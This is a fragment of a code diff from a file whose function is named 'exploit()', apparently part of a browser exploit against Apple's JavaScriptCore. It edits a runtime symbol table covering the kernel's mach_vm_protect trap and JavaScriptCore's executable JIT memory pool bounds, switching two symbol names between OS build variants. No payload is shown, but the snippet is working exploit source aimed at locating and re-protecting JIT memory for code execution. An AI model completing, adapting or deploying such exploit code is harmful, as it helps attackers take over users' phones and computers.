@@ -681,8 +681,8 @@ function exploit(){
             "/usr/lib/system/libsystem_kernel.dylib":                               ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
             "/usr/lib/system/libsystem_c.dylib":                                    ["_usleep"],
             "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   [
-                "__ZN3JSC32taggedstartOfFixedExecutableMemoryPoolE",
-                "__ZN3JSC30taggedendOfFixedExecutableMemoryPoolE",
+                "__ZN3JSC32startOfFixedExecutableMemoryPoolE",
+                "__ZN3JSC30endOfFixedExecutableMemoryPoolE",
             ],
         };
 
